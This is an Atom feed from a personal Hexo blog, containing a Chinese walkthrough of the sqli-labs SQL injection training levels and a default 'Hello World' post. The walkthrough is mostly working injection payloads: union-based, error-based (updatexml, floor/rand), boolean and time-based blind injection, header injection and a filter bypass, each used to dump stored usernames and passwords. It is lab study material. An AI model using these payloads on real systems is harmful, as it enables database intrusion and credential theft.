<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>scw&#39;blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-05-24T13:56:41.354Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>scw</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqli-labs</title>
    <link href="http://example.com/2022/05/24/sqli-labs/"/>
    <id>http://example.com/2022/05/24/sqli-labs/</id>
    <published>2022-05-24T13:56:41.354Z</published>
    <updated>2022-05-24T13:56:41.354Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><span id="more"></span><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>先用<code>id=1&#39; and 1=1</code>和<code>id=1&#39; and 1=2</code>注入得出该题是字符型注入，接着用<code>id=1&#39; order by x--+</code>查询列数为3，再接着用<code>id=-1 union select 1,2,3--+</code>联合注入得出回显位置是多少(注意此处id用-1而不用1的原因是，当数据库中存在id为1时将不会执行后面语句)，接着用<code>id=-1&#39; union select 1,2,database()--+</code>得出当前库名为sercuity,然后用<code>id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code>查询出当前库中存在的所有表名，再通过<code>id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code>获取user表中的所有列，再通过<code>id=-1&#39; union select 1,2,group_concat(username) from security.users--+</code>和<code>id=-1 union select 1,2,group_concat(password) from security.users--+</code>获取用户名和密码</p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>先用<code>id=1 and 1=1--+</code>和<code>id=1 and 1=2--+</code>注入得出该题是数字型注入，接着用<code>id=1 order by x--+</code>查询列数为3，再接着用<code>id=-1 union select 1,2,3--+</code>联合注入得出回显位置是多少，接着用<code>id=-1 union select 1,2,database()--+</code>得出当前库名为sercuity,然后用<code>id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code>查询出当前库中存在的所有表名，再通过<code>id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code>获取user表中的所有列，再通过<code>id=-1 union select 1,2,group_concat(username) from security.users--+</code>和<code>id=-1 union select 1,2,group_concat(password) from security.users--+</code>获取用户名和密码</p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>常规注入通过回显发现还需要<code>&#39;)</code>闭合，接着用<code>id=1&#39;) order by x--+</code>查询列数为3，再接着用<code>id=-1&#39;) union select 1,2,3--+</code>联合注入得出回显位置是多少，接着用<code>id=-1&#39;) union select 1,2,database()--+</code>得出当前库名为sercuity,然后用<code>id=-1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code>查询出当前库中存在的所有表名，再通过<code>id=-1&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code>获取user表中的所有列，再通过<code>id=-1&#39;) union select 1,2,group_concat(username) from security.users--+</code>和<code>id=-1 union select 1,2,group_concat(password) from security.users--+</code>获取用户名和密码</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>通过常规注入发现需要<code>&quot;)</code>闭合，接着用<code>id=1“) order by x--+</code>查询列数为3，再接着用<code>id=-1”) union select 1,2,3--+</code>联合注入得出回显位置是多少，接着用<code>id=-1“) union select 1,2,database()--+</code>得出当前库名为sercuity,然后用<code>id=-1”) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code>查询出当前库中存在的所有表名，再通过<code>id=-1“) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code>获取user表中的所有列，再通过<code>id=-1”) union select 1,2,group_concat(username) from security.users--+</code>和<code>id=-1 union select 1,2,group_concat(password) from security.users--+</code>获取用户名和密码</p><h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>通过常规注入发现用<code>&#39;</code>闭合，接着发现这道题只会回显注入成功与否，不会回显查询结果，再看题发现是双查询注入，利用<code>?id=1&#39; union select 1,count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a--+</code>报错得出当前库名security(由于rand()是随机数，如果不爆出来可以多试几次)，用<code>id=1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),floor(rand()*2)) as a from information_schema.columns group by a--+</code>改变<code>limit x,1</code>依次查询出当前库的表名，用<code>id=1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),floor(rand()*2)) as a from information_schema.columns group by a--+</code>改变<code>limit x,1</code>依次查询出当前表的所有列，用<code>id=1&#39; union select 1,count(*),concat((select username from security.users limit 0,1),floor(rand()*2)) as a from information_schema.columns group by a--+</code>和<code>id=1&#39; union select 1,count(*),concat((select password from security.users limit 0,1),floor(rand()*2)) as a from information_schema.columns group by a--+</code>改变<code>limit x,1</code>依次查询出所有用户和密码</p><p>也可以使用布尔盲注和时间盲注</p><h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>常规注入发现需要<code>&quot;</code>闭合，剩下步骤与上题一致</p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>常规注入发现需要<code>&#39;))</code>来闭合，发现依旧没有回显，只会回注入成功与否，尝试双查询注入不行，所以试布尔盲注发现可以回显对错，用<code>id=1&#39;)) and length(database())=x--+</code>查询长度，发现库名长度为8，接着用<code>id=1&#39;)) and substr(database(),1,1)=&#39;s&#39;--+</code>修改<code>database(),1,x</code>和<code>s</code>往后增加字母26个依次试，最终试出库名<code>security</code>，再接着用<code>id=1&#39;)) and length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1))=6--+</code>,修改<code>limit 0,1</code>和后面的数字即可试出每个表名的长度，然后用<code>id=1&#39;)) and substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)=&#39;e&#39;--+</code></p><p>,通过修改<code>limit x,1)x,1=&#39;x&#39;</code>中x的位置即可试出每个表名，查询出列名长度后接着用<code>id=1&#39;)) and substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)=&#39;i&#39;--+</code>，修改<code>limit x,1)x,1=&#39;x&#39;</code>中x的位置即可试出每个列名,试出用户名和密码长度最后用<code>id=1&#39;)) and substr((select username from security.users limit 0,1),1,1)=&#39;d&#39;--+</code>和<code>id=1&#39;)) and substr((select password from security.users limit 0,1),1,1)=&#39;d&#39;--+</code>修改<code>limit x,1)x,1=&#39;x&#39;</code>中x的位置即可获取用户名和密码</p><h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>常规注入发现需要<code>&#39;</code>来闭合，剩下操作与上题一致。</p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><p>常规注入发现不管对错只会回显<code>You are in...........</code>,所以可以考虑用时间盲注，用<code>id=1&#39;and sleep(5)--+</code>发现响应时间为5秒，因此可以得知需要用<code>&#39;</code>来闭合，通过<code>id=1&#39;and if(length(database())=8,sleep(5),0)--+</code>修改<code>length(database())=8</code>其中8的位置，当页面响应时间为5秒时即可得出当前库名长度，然后用<code>id=1&#39;and if(substr((database()),1,1)=&#39;s&#39;,sleep(5),0)--+</code>修改<code>&#39;s&#39;</code>和<code>substr( ,x,1)</code>中x的值即可得出库名，查询出表名长度后再通过<code>id=1&#39;and if(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)=&#39;e&#39;,sleep(5),0)--+</code>通过修改<code>&#39;e&#39;</code>和<code>limit x,1</code>和<code>substr( ,x,1)</code>x的部分即可得出表名，查询列名长度后接着用<code>id=1&#39;and if(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)=&#39;i&#39;,sleep(5),0)--+</code>通过修改<code>&#39;i&#39;</code>和<code>limit x,1</code>和<code>substr( ,x,1)</code>x的部分即可得出所以列名，试出用户名和密码长度最后用<code>id=1&#39;and if(substr((select username from security.users limit 0,1),1,1)=&#39;d&#39;,sleep(5),0)--+</code>和<code>id=1&#39;and if(substr((select password from security.users limit 0,1),1,1)=&#39;d&#39;,sleep(5),0)--+</code>修改<code>limit x,1</code>和<code>substr( ,x,1)</code>中x的位置以及<code>d</code>即可得出用户名和密码</p><h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>通过<code>id=1&quot; and sleep(5)--+</code>发现需要<code>&quot;</code>来闭合，其余与上一题一致</p><h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>与第一题相比只是换了个传参方式，需注意该处用户名要输入对如<code>admin</code>,然后要用#去注释然后密码和用户都需要输入东西</p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>与上一题相比只是闭合方式变为<code>&quot;)</code></p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>闭合方式为<code>&#39;)</code>，其余与level 5做题方法一样</p><h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p>闭合方式为<code>&quot;</code>，其余与上一题一样</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>闭合方式为<code>&#39;</code>，其余与level 7或level 9一样</p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h3><p>闭合方式为<code>&quot;)</code>，其余与上一题一样</p><h3 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h3><p>这题用户名被过滤了，所以可以考虑在密码处进行注入，发现无论输入什么都会报错，因此可以考虑报错注入，<code>&#39; and updatexml(1,concat(&#39;~&#39;,(database())),3)#</code>获取当前库名，接着用<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),3)#</code>依次获取当前表名，然后用<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1)),3)#</code>依次获取当前列名，最后用<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select username from security.users limit 0,1)),3)#</code>和<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select password from security.users limit 0,1)),3)#</code>获取用户名和密码</p><h3 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h3><p>从题目可以看出需要在应用层http请求处注入，发现会回显<code>User-Agent</code>,可以尝试在这里注入，发现可以利用<code>&#39;</code>闭合就证明可以在这里注入，需注意的是注释不要用<code>#</code>和<code>--+</code>，需要用<code>&#39;1&#39;=&#39;1</code>来闭合后面的<code>&#39;</code>,其余与上一题一致。</p><h3 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h3><p>从题目可以看出需要在应用层http请求处注入，发现会回显<code>Referer</code>，可以考虑在这里注入，其余与上题一致</p><h3 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h3><h3 id="level-21"><a href="#level-21" class="headerlink" title="level 21"></a>level 21</h3><h3 id="level-22"><a href="#level-22" class="headerlink" title="level 22"></a>level 22</h3><h3 id="level-23"><a href="#level-23" class="headerlink" title="level 23"></a>level 23</h3><p>该题过滤了一些注释符号，可以考虑用单引号将后面的单引号也闭合，如<code>id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select database())),3) and &#39;1&#39;=&#39;1</code>查询出当前库名，其余和level 17一致</p><h3 id="level-24"><a href="#level-24" class="headerlink" title="level 24"></a>level 24</h3><p>该题运用二次注入</p><h3 id="level-25"><a href="#level-25" class="headerlink" title="level 25"></a>level 25</h3><p>该题过滤了<code>and</code>和<code>or</code>,可以采用双写绕过，即<code>aandnd</code>和<code>oorr</code>,其余均与level 1一致</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;sqli-labs&quot;&gt;&lt;a href=&quot;#sqli-labs&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs&quot;&gt;&lt;/a&gt;sqli-labs&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2022/05/24/hello-world/"/>
    <id>http://example.com/2022/05/24/hello-world/</id>
    <published>2022-05-24T05:05:47.010Z</published>
    <updated>2022-05-24T05:05:47.010Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
